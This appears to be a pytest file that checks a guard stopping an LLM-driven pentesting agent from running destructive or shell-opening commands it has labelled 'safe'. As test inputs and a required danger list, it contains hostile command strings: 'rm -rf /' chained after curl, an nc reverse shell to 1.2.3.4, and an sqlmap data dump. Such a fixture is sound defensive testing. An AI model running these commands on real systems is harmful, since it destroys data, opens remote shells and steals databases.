"""The LLM test-synthesizer must FAIL SAFE.

test_synth lets an LLM write a custom command; the danger is that a model marks
a data-changing or shell command "safe" and it lands in the autonomous lane.
`classify_synth` is the guard: dangerous tokens or an LLM 'impactful' hint force
impactful, and only the engine's _classify can bless a safe tier.

Extracted with ast and run against a STUB _classify, so it exercises the real
source offline (no langgraph_engine / langchain import).

Sabotage: delete the `_DANGER` check in classify_synth -> the rm/shell cases
flip to safe -> this test RED.
"""
import ast
import os

import pytest

REPO = os.path.realpath(os.path.join(os.path.dirname(__file__), ".."))
MOD = os.path.join(REPO, "autogen_agents", "test_synth.py")


def _load_classify():
    if not os.path.exists(MOD):
        pytest.skip("test_synth.py not present")
    tree = ast.parse(open(MOD, encoding="utf-8").read())
    # stub the engine-provided names classify_synth closes over
    ns = {
        "_SAFE_CATEGORIES": {"http_probe", "lfi_read", "xss_detect", "tls_check"},
        "_classify": lambda cat, cmd, has_exploit_ref=False: (
            "safe" if cat in {"http_probe", "lfi_read", "xss_detect", "tls_check"} else "impactful"),
    }
    for node in tree.body:
        if isinstance(node, ast.Assign) and getattr(node.targets[0], "id", "") == "_DANGER":
            exec(compile(ast.Module([node], []), "<d>", "exec"), ns)
        if isinstance(node, ast.FunctionDef) and node.name == "classify_synth":
            exec(compile(ast.Module([node], []), "<f>", "exec"), ns)
    assert "classify_synth" in ns and "_DANGER" in ns, "could not extract classify_synth/_DANGER"
    return ns["classify_synth"], ns["_DANGER"]


def test_danger_set_covers_the_obvious_weapons():
    _, danger = _load_classify()
    joined = " ".join(danger).lower()
    for needle in ("--dump", "rm -rf", "/dev/tcp", "meterpreter", "bash -i"):
        assert needle in joined, f"_DANGER missing {needle!r}"


def test_classify_synth_fails_safe():
    c, _ = _load_classify()
    # clean safe probe with a safe category -> safe
    assert c("http_probe", "curl -sk http://x/", "safe") == "safe"
    # dangerous token overrides an LLM 'safe'
    assert c("http_probe", "curl http://x/ ; rm -rf /", "safe") == "impactful"
    assert c("http_probe", "curl http://x/ && nc -e /bin/sh 1.2.3.4 9001", "safe") == "impactful"
    assert c("lfi_read", "sqlmap -u http://x --dump", "safe") == "impactful"
    # LLM's own 'impactful' is honoured
    assert c("http_probe", "curl -sk http://x/", "impactful") == "impactful"
    # a non-safe category can never be safe
    assert c("rce", "nuclei -u http://x -tags rce", "safe") == "impactful"
